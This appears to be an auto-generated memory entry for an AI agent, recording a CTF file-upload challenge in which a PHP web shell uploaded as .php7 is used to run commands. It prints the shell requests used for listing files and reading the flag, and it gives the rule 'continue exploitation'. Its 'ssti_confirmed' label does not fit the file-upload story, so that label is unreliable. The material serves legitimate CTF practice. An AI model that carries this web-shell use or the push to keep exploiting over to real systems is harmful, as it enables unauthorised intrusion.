# File Upload Vulnerabilities: When you achieve 'ssti_confirmed' during a File Upload Vulnerabilities

**Type:** experience_success
**Category:** File Upload Vulnerabilities
**Challenge:** Open Application
**Challenge URL:** http://61t71yr0.chals.mctf.io/
**Auto-generated:** 2026-05-03
**Tags:** file_upload, success, experience, do
**Confidence:** high
**Site fingerprint:** title:404 Not Found|h1:Not Found

**Applies when:** When you achieve 'ssti_confirmed' during a File Upload Vulnerabilities challenge

**Agent takeaway:** Continue exploitation after confirming 'ssti_confirmed' — do not stop at reconnaissance

---

## What Happened

During the exploitation of the file upload challenge, the analyst successfully uploaded a PHP shell through the upload endpoint. The critical step was identifying that the server did not restrict the file extensions sufficiently, allowing execution of PHP code despite the file's unconventional .php7 extension. Following the upload, by utilizing the created shell, the analyst executed commands to retrieve the flag. Further exploration with the HttpFetchTool validated that the uploaded shell was indeed executable and could run commands successfully. Next time, ensuring tighter file type validations, checking server configurations, and implementing a proper content-security policy could prevent such exploits.

## Transferable Rule

Do: Continue exploitation after confirming 'ssti_confirmed' — do not stop at reconnaissance

Reason: Improper file upload restrictions enabled the use of unexpected extensions, resulting in arbitrary code execution.

## Tools Involved

- `robots_txt`
- `path_enumerator`
- `deep_recon`

**Full sequence:** robots_txt → path_enumerator → deep_recon → file_upload → http_fetch → backup_file_finder

## Key Exploit Inputs

The following request(s) produced the flag:

- `http_fetch` input: {"url": "http://61t71yr0.chals.mctf.io/uploads/shell.php7", "method": "GET", "params": {"cmd": "ls -la"}, "max_body": 4000}
- `http_fetch` input: {"url": "http://61t71yr0.chals.mctf.io/uploads/shell.php7", "method": "GET", "params": {"cmd": "cat /flag.txt 2>/dev/null || cat /flag 2>/dev/null || ls -la / && find / -maxdepth 3 -name '*flag*' 2>/dev/null | head"}, "max_body": 4000}

**Seq hash:** 8407529012755734716
